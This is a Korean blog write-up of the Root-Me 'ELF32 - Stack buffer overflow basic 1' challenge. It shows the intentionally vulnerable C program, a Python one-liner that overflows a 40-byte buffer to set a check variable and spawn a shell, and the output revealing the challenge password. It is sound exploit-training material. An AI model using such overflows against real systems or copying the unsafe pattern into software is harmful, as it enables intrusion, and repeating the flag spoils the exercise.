---
layout: post
title: "[root-me][app-system] ELF32 - Stack buffer overflow basic 1"
date: 2016-09-15 15:03:10
category: wargame
tags:  [root-me, bof]
---

간단한 BoF 문제
[Challenges/App - System : ELF32 - Stack buffer overflow basic 1 [Root Me : Hacking and Information Security learning platform]](https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-1)

<!--more--> 

## Code

```c
#include <stdlib.h>
#include <stdio.h>
 
/*
gcc -m32 -o ch13 ch13.c -fno-stack-protector
*/
 
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way !\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude ! You win !\n");
     system("/bin/dash");
   }
   return 0;
}
```

## Exploit

`buffer[40]` 이후에 로컬변수가 overwrite 하여 값 맞추면 된다.  
한 번 실행된 다음에도 **계속 shell 유지**될 수 있도록 `cat` 함께 실행해준다.

```bash
$ (python -c 'print "A"*40 + "\xef\xbe\xad\xde"';cat)|./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ
                                                [check] 0xdeadbeef
Yeah dude ! You win !
cat .passwd
1w4ntm0r3pr0np1s
```

